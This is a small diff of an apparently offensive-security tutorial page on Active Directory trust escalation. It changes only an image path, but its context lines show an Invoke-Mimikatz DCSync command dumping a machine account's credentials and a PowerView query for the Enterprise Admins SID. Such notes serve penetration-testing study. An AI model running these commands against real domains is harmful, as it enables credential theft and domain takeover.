@@ -38,7 +38,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:amsterdam\bank$"'
 Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccountname, objectsid
 ```
 
-![](<../../../.gitbook/assets/image (76).png>)
+![](<../../../.gitbook/assets/image (76) (1).png>)
 
 5\. Retrieve the domain SID from the child domain, using PowerView:
 
